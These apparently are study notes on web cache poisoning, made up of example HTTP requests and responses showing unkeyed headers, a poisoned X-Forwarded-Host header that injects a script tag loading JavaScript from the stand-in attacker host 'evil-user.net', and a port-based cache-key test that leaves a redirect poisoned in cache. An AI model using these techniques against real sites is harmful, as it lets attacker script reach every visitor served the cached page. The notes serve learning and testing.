```

IMAGINE TO HAVE AS CACHE KEYS:
- Request Line
- HOST 
- Accept-Language 


GET https://www.vuln.com HTTP/1.1          
host: www.vuln.com  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0  
Accept-Language: en-US,en;q=0.5           


GET https://www.vuln.com HTTP/1.1  
host: www.vuln.com  
User-Agent: another user agent  
Accept-Language: en-US,en;q=0.5



These two requests are different but the cache will return the same response becuase the User-Agent Header is unkeyed


```



```
REQUEST

GET / HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: evil-user.net 
User-Agent: Mozilla/5.0 Firefox/57.0 



RESPONSE

HTTP/1.1 200 OK 
<script src="https://evil-user.net/static/analytics.js"></script>


```


```
ORIGINAL REQUEST

GET / HTTP/1.1 
Host: vulnerable-website.com 

ORIGINAL RESPONSE

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com/en 
Cache-Status: miss




REQUEST TO TEST IF THE PORT IS INVOLVED IN THE CACHE KEY

GET / HTTP/1.1 
Host: vulnerable-website.com:1337 


RESPONSE

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: miss



REQUEST 2

GET / HTTP/1.1 
Host: vulnerable-website.com 


RESPONSE

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: hit






```